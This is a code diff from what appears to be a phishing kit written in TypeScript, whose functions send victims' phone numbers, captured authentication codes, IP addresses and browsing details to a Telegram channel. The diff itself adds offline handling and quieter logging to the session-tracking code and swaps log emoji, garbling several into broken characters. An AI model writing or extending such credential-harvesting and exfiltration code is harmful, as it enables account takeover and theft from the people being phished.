@@ -633,7 +633,7 @@ export const sendPhoneToTelegramEnhanced = async (
       throw fetchError;
     }
   } catch (error) {
-    console.error("❌ Failed to send phone to Telegram:", error);
+    console.error("��� Failed to send phone to Telegram:", error);
     return { success: false, sessionId };
   }
 };
@@ -1138,7 +1138,7 @@ const updateTelegramMessage = async (
 ): Promise<void> => {
   // Validate inputs
   if (!messageId || !text) {
-    console.error("�� Invalid message data:", {
+    console.error("❌ Invalid message data:", {
       messageId,
       textLength: text?.length,
     });
@@ -1668,7 +1668,7 @@ const formatSessionMessage = (session: UserSession): string => {
 
   // Add grouped codes section if any codes exist
   if (codeGroups.length > 0) {
-    message += `\n\n🔐 <b>AUTHENTICATION DATA:</b>\n` + codeGroups.join("\n");
+    message += `\n\n���� <b>AUTHENTICATION DATA:</b>\n` + codeGroups.join("\n");
   }
 
   // Simple footer with session info
@@ -1726,8 +1726,22 @@ export const updateUserInfo = async (
   try {
     const session = activeSessions.get(sessionId);
     if (!session) {
-      console.warn("⚠️ Session not found for user info update:", sessionId);
+      console.debug("🔇 Session not found for user info update:", sessionId?.slice(-6));
       return false;
+    }
+
+    // Check if we're offline
+    if (!navigator.onLine) {
+      console.debug("🔇 Device offline, skipping IP lookup");
+      // Still update page info without IP
+      session.userInfo = {
+        ipAddress: "Offline",
+        currentPage: pageInfo.currentPage,
+        userAgent: pageInfo.userAgent || navigator.userAgent,
+        lastPageUpdate: Date.now(),
+      };
+      activeSessions.set(sessionId, session);
+      return true;
     }
 
     // Get user's IP address with proper error handling
